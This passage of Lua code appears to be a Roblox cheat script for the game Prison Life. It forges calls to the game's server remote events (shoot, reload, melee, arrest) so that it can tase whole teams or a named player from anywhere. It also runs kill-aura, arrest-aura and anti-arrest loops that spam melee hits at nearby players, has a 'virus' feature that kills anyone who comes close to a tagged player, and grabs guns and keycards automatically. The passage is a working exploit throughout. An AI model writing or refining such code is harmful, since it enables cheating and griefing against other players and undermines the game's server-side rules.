            game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
        end)
        wait(.7)
        API:ChangeTeam(Oldt)
    elseif target == "criminals" then
        local Oldt = Player.Team
        API:ChangeTeam(game.Teams.Guards)
        repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
        wait(.7)
        local ohTable1 = {}
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v and v~= Player and v.Team ~= game.Teams.Guards and v.Team ==game.Teams.Criminals then
                table.insert(ohTable1,{
                    ["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
                    ["Distance"] = -1,
                    ["Cframe"] = CFrame.new(),
                    ["Hit"] = v.Character.Head
                })
            end
        end
        local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
        game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
        task.spawn(function()
            game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
        end)
        wait(.7)
        API:ChangeTeam(Oldt)
    elseif target == "inmates" then
        local Oldt = Player.Team
        API:ChangeTeam(game.Teams.Guards)
        repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
        wait()
        local ohTable1 = {}
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v and v~= Player and v.Team ~= game.Teams.Guards and v.Team ==game.Teams.Inmates then
                table.insert(ohTable1, {
                    ["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
                    ["Distance"] = -1,
                    ["Cframe"] = CFrame.new(),
                    ["Hit"] = v.Character.Head
                })
            end
        end
        local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
        game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
        task.spawn(function()
            game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
        end)
        wait(.7)
        API:ChangeTeam(Oldt)
    else
        local Target = API:FindPlayer(target)
        if Target then
            local Oldt = Player.Team
            API:ChangeTeam(game.Teams.Guards)
            repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
            wait(.7)
            local ohTable1 = {
                [1] = {
                    ["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
                    ["Distance"] = 0,
                    ["Cframe"] = CFrame.new(),
                    ["Hit"] = Target.Character.Head
                }
            }
            local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack.Taser

            game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
            task.spawn(function()
                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
            end)
            wait(.1)
            API:ChangeTeam(Oldt)
        end
    end
end

local ChangeState = function(Type,StateType)
	local Value = nil
	if Type and typeof(Type):lower() == "string" and (Type):lower() == "on" then
		Value = true
	elseif Type and typeof(Type):lower() == "string" and (Type):lower() == "off" then
		Value = false
	elseif typeof(Type):lower() == "boolean" then
		Value = Type
	else
		Value = not States[StateType]
	end
	States[StateType] = Value
	API:Notif(StateType.." has been changed to "..tostring(Value))
	return Value
end

plr.CharacterAdded:Connect(function(NewCharacter)
	if Unloaded then
		return
	end
	task.spawn(function()
		if States.AutoItems then
            local OldCFrame = plr.Character:WaitForChild("HumanoidRootPart").CFrame
            wait(.5)
            if Player.Backpack:FindFirstChild("Key card") then
                
            else
                API:Keycard()
            end
			wait(3)
			API:AllGuns()
            API:MoveTo(OldCFrame)
		end
	end)
	repeat API:swait() until NewCharacter
	NewCharacter:WaitForChild("HumanoidRootPart")
	NewCharacter:WaitForChild("Head")
	NewCharacter:WaitForChild("Humanoid").BreakJointsOnDeath = not States.AutoRespawn
	NewCharacter:WaitForChild("Humanoid").Died:Connect(function()
		if not Unloaded and States.AutoRespawn == true then
			API:Refresh()
			task.spawn(function()
				if States.AutoItems then
                    wait(.5)
                    local OldCFrame2 = plr.Character:WaitForChild("HumanoidRootPart").CFrame
                    if plr.Backpack:FindFirstChild("Key card") then
                        --nothing
                    else
                        API:Keycard()
                    end
					wait(3)

					API:AllGuns()

                    API:MoveTo(OldCFrame2)
				end
			end)
		end
	end)
	if Temp.ArrestOldP and States.AntiArrest then
		coroutine.wrap(function()
			API:MoveTo(Temp.ArrestOldP)
			Temp.ArrestOldP = nil

            local oldCframe = plr.Character:WaitForChild("HumanoidRootPart").CFrame
            API:Keycard()
            wait(2)
            API:AllGuns()
            API:MoveTo(oldCframe)
		end)()
	end
	task.spawn(function()
		if States.AntiArrest then
			plr.Character:FindFirstChild("Head").ChildAdded:Connect(function(a)
				if not Unloaded then
					if a and a:IsA("BillboardGui") and States.AntiArrest then
						API:Refresh()
						coroutine.wrap(function()
							wait(1)
							Temp.ArrestOldP = API:GetPosition()
						end)()
					end
				end
			end)
		end
	end)
end)

coroutine.wrap(function()
	while wait() do --// fast loop
		if Unloaded then
			return
		end
		for i,v in pairs(Temp.Viruses) do
			for _,a in pairs(game:GetService("Players"):GetPlayers()) do
				if a and a ~= v and a ~= Player then
					if a and a.Character and a.Character:FindFirstChild("HumanoidRootPart") and(a.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude <4.5 and a.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,a) then
						if not cdv then
							cdv = true
							API:KillPlayer(a)
							wait(.7)
							cdv = false
						end
					end
				end
			end
		end
		game:GetService('StarterGui'):SetCoreGuiEnabled('Backpack', true)
		pcall(function()
			if States.AntiArrest == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,v) then
							if v.Character:FindFirstChildOfClass("Tool") and v.Character:FindFirstChild("Handcuffs") and not v.Character:FindFirstChild("Handcuffs"):FindFirstChild("ISWHITELISTED") then
								local args = {
									[1] = v
								}
								for i =1,3 do
									task.spawn(function()
										game:GetService("ReplicatedStorage").meleeEvent:FireServer(unpack(args))
									end)
								end
							end
						end
					end
				end
			end
		end)
		pcall(function()
			if States.AntiTouch == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <2.3 and v.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,v) then
							local args = {
								[1] = v
							}
							for i =1,8 do
								task.spawn(function()
									game:GetService("ReplicatedStorage").meleeEvent:FireServer(unpack(args))
								end)
							end
						end
					end
				end
			end
		end)

		pcall(function()
			if States.ArrestAura == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player and v.Team ~= game.Teams.Guards then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,v) then
							local args = {
								[1] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part")
							}
							if v.Team == game.Teams.Criminals or (v.Team == game.Teams.Inmates and API:BadArea(v)) then
								workspace.Remote.arrest:InvokeServer(unpack(args))
							end
						end
					end
				end
			end
		end)
		pcall(function()
			if States.killaura == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player and not table.find(API.Whitelisted,v) then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,v) then
							local args = {
								[1] = v
							}
							for i =1,3 do
								task.spawn(function()
									game:GetService("ReplicatedStorage").meleeEvent:FireServer(unpack(args))
								end)
							end
						end
					end
				end
			end
		end)
	end
end)()

